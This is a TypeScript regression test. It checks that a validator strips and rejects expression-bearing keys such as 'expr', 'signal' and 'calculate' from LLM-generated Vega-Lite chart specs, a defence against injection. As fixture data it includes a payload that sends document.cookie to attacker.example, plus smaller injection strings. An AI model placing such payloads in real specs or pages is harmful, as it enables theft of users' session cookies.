/**
 * Regression test for CRITICAL C2 — Vega-Lite expression injection.
 *
 * Vega evaluates Vega-Expression strings in `signal`, `params[].expr`,
 * `transform[].calculate`, `mark.tooltip.signal`, `signal.on[].update`,
 * `signal.init`, etc. An LLM-emitted spec with one of these fields runs
 * arbitrary JS inside the user's admin browser session. The fix:
 *
 *   1. `stripVegaExpressions` recursively prunes every dangerous key from
 *      the spec before it is handed to vega-embed.
 *   2. `validateVegaSpec` rejects via ajv `propertyNames` if any of those
 *      keys are present anywhere in the spec tree.
 *
 * This test exercises both paths.
 */

import { describe, it, expect } from 'vitest';

import {
  stripVegaExpressions,
  validateVegaSpec,
  VEGA_EXPRESSION_KEYS,
} from '../validate';

const DANGEROUS_PARAMS = [
  {
    name: 'x',
    expr: "window.location='https://attacker.example/?c='+document.cookie",
  },
];

describe('stripVegaExpressions (C2)', () => {
  it('strips top-level `params` array', () => {
    const spec = { mark: 'bar', params: DANGEROUS_PARAMS };
    const { safe, stripped } = stripVegaExpressions(spec);
    const safeObj = safe as Record<string, unknown>;
    expect(safeObj.params).toBeUndefined();
    expect(safeObj.mark).toBe('bar');
    expect(stripped).toContain('$.params');
  });

  it('strips nested `signal` inside mark.tooltip', () => {
    const spec = {
      mark: { type: 'bar', tooltip: { signal: 'datum.x' } },
      encoding: {},
    };
    const { safe, stripped } = stripVegaExpressions(spec);
    const safeMark = (safe as { mark: { tooltip: Record<string, unknown> } })
      .mark;
    expect(safeMark.tooltip).toEqual({});
    expect(stripped).toContain('$.mark.tooltip.signal');
  });

  it('strips `expr` inside transform[]', () => {
    const spec = {
      mark: 'line',
      encoding: {},
      transform: [{ filter: 'datum.x > 0', expr: 'eval("danger")' }],
    };
    const { safe, stripped } = stripVegaExpressions(spec);
    const safeTransform = (safe as { transform: Array<Record<string, unknown>> })
      .transform;
    expect(safeTransform[0]!.expr).toBeUndefined();
    expect(stripped).toContain('$.transform[0].expr');
  });

  it('strips `calculate` inside transform[]', () => {
    const spec = {
      mark: 'line',
      encoding: {},
      transform: [{ as: 'doubled', calculate: 'datum.x * 2' }],
    };
    const { safe, stripped } = stripVegaExpressions(spec);
    const safeT = (safe as { transform: Array<Record<string, unknown>> })
      .transform;
    expect(safeT[0]!.calculate).toBeUndefined();
    expect(stripped).toContain('$.transform[0].calculate');
  });

  it('strips `update` / `init` from signal definitions deep in layer', () => {
    const spec = {
      layer: [
        { mark: 'point', encoding: {} },
        {
          mark: 'line',
          encoding: {},
          signals: [{ name: 'x', init: 'window', update: 'document' }],
        },
      ],
    };
    const { safe, stripped } = stripVegaExpressions(spec);
    const layer = (safe as { layer: Array<Record<string, unknown>> }).layer;
    // The `signals` array still exists but each item has neither init nor
    // update — both keys were on the inner objects, so they're pruned.
    const signals = (layer[1] as { signals: Array<Record<string, unknown>> })
      .signals;
    expect(signals[0]!.init).toBeUndefined();
    expect(signals[0]!.update).toBeUndefined();
    expect(stripped).toContain('$.layer[1].signals[0].init');
    expect(stripped).toContain('$.layer[1].signals[0].update');
  });

  it('returns the same spec untouched if no expression keys are present', () => {
    const spec = { mark: 'bar', encoding: { x: { field: 'a' } } };
    const { safe, stripped } = stripVegaExpressions(spec);
    expect(safe).toEqual(spec);
    expect(stripped).toHaveLength(0);
  });

  it('exposes the full key set so callers can audit it', () => {
    expect(Array.from(VEGA_EXPRESSION_KEYS).sort()).toEqual(
      ['calculate', 'expr', 'init', 'params', 'signal', 'update'].sort(),
    );
  });
});

describe('validateVegaSpec (C2)', () => {
  it('rejects a spec containing top-level `params` with an `expr`', async () => {
    const result = await validateVegaSpec({
      mark: 'bar',
      encoding: {},
      params: DANGEROUS_PARAMS,
    });
    expect(result.ok).toBe(false);
    // The dangerous params key was removed from safeSpec for graceful
    // render-fallback.
    expect(result.safeSpec).toBeDefined();
    expect(
      (result.safeSpec as Record<string, unknown>).params,
    ).toBeUndefined();
    expect(result.strippedPaths).toContain('$.params');
  });

  it('rejects a spec with `signal` nested deep inside mark', async () => {
    const result = await validateVegaSpec({
      mark: { type: 'bar', tooltip: { signal: 'document.cookie' } },
      encoding: {},
    });
    expect(result.ok).toBe(false);
    expect(result.strippedPaths).toContain('$.mark.tooltip.signal');
  });

  it('returns a clean spec untouched and ok=true when no expression keys exist', async () => {
    const result = await validateVegaSpec({
      mark: 'bar',
      encoding: { x: { field: 'a' } },
    });
    expect(result.ok).toBe(true);
    expect(result.strippedPaths).toHaveLength(0);
    expect(result.safeSpec).toEqual({
      mark: 'bar',
      encoding: { x: { field: 'a' } },
    });
  });

  it('ensures the literal exploit payload is NOT present in safeSpec', async () => {
    const exploit =
      "window.location='https://attacker.example/?c='+document.cookie";
    const result = await validateVegaSpec({
      mark: 'bar',
      encoding: {},
      params: [{ name: 'x', expr: exploit }],
    });
    const serialized = JSON.stringify(result.safeSpec);
    expect(serialized).not.toContain(exploit);
    expect(serialized).not.toContain('window.location');
    expect(serialized).not.toContain('document.cookie');
  });
});
